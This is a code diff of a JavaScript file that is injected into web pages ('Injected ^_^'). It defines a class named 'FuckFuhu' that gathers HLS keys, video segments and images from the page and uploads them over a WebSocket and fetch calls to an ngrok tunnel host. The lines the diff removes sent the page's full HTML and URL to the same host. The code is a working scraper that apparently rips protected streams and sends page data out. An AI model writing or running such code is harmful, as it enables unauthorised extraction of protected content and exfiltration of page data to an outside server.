@@ -1,20 +1,3 @@
-setTimeout(() => {
-  const ws = new WebSocket(`wss://${window.host}/ws`);
-  ws.onopen = function () {
-    ws.send(
-      JSON.stringify({
-        action: "log_source",
-        payload: {
-          url: window.location.href,
-          source: document.documentElement.outerHTML,
-        },
-      })
-    );
-
-    setTimeout(() => ws.close(), 250);
-  };
-}, 3000);
-
 alert("Injected ^_^");
 window.host = "eel-moral-ape.ngrok-free.app";
 window.socket = new WebSocket(`wss://${window.host}/ws`);
@@ -34,14 +17,24 @@ window.socket.onopen = function () {
     3000
   );
 };
+window.socket.onmessage = function (event) {
+  if (typeof fuckFuhu !== "undefined" && event.data) {
+    const payload = JSON.parse(event.data);
+    if (payload.type === "images" && payload.status === "ok") {
+      fuckFuhu.uploadImageSuccess(payload.fileName);
+    }
+  }
+};
 
 class FuckFuhu {
   hlsKeys = [];
   segments = [];
+  totalImage = 0;
   host = window.host;
   socket = window.socket;
   embedUrl = window.location.href;
-  constructor(fid, elmId) {
+  uploadStatusElm = document.createElement("div");
+  constructor(fid) {
     this.fid = fid;
 
     if (document.querySelector("video")) {
@@ -139,6 +132,51 @@ class FuckFuhu {
     }
   };
 
+  uploadImageSuccess = (newFile) => {
+    if (newFile) {
+      this.segments.push(newFile);
+    }
+
+    this.uploadStatusElm.textContent = `${this.fid}: ${this.segments.length}/${this.totalImage}`;
+
+    if (this.segments.length === this.totalImage) {
+      fetch(`https://${this.host}/api/submit-upload`, {
+        method: "POST",
+        body: JSON.stringify({
+          fid: this.fid,
+          type: "images",
+          segments: this.segments,
+        }),
+        headers: {
+          "Content-Type": "application/json",
+        },
+      })
+        .then((res) => res.json())
+        .then((result) => {
+          if (result.status === "ready") {
+            this.uploadStatusElm.textContent = `${this.fid}: Ready`;
+          }
+        })
+        .catch((error) => alert(error.message));
+    }
+  };
+
+  setTotalImage = (total) => {
+    this.totalImage = total;
+    Object.assign(this.uploadStatusElm.style, {
+      top: 0,
+      right: 0,
+      zIndex: 99999,
+      color: "#fff",
+      position: "fixed",
+      padding: "2px 8px",
+      backgroundColor: "#000",
+    });
+
+    this.uploadImageSuccess();
+    document.body.append(this.uploadStatusElm);
+  };
+
   uploadImage = (image, name) => {
     const canvas = document.createElement("canvas");
     const context = canvas.getContext("2d");
@@ -148,9 +186,9 @@ class FuckFuhu {
     canvas.toBlob(
       async (blob) => {
         try {
-          const imageName = `${this.fid}/${name}.webp`;
+          const imageName = name + ".webp";
           const payload = new TextEncoder().encode(
-            JSON.stringify({ type: "image", url: imageName, fid: this.fid })
+            JSON.stringify({ type: "images", url: imageName, fid: this.fid })
           );
           const data = new Uint8Array(4 + payload.length + blob.size);
 
@@ -164,7 +202,6 @@ class FuckFuhu {
           context.clearRect(0, 0, canvas.width, canvas.height);
           canvas.remove();
         } catch (error) {
-          console.log(error);
           alert(error.message);
         }
       },
